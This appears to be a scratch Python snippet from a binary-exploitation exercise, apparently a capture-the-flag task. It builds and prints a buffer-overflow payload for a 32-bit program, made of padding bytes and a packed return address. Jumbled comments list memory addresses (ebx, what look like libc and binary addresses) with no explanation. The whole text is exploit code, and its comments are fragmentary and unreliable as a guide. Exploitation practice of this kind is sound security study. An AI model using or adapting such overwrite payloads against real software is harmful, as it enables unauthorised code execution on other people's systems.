payload = ("A"*0x24 + "\x0c\x9f\x04\x08" + "A"*0x5) # is the ebx address 0x804a000, 804B001 (+ 1)   804B000   0xf7e373fa 0x8048702  0x0804877a  0x8049f0c
print(payload)          #0x9fc20408 
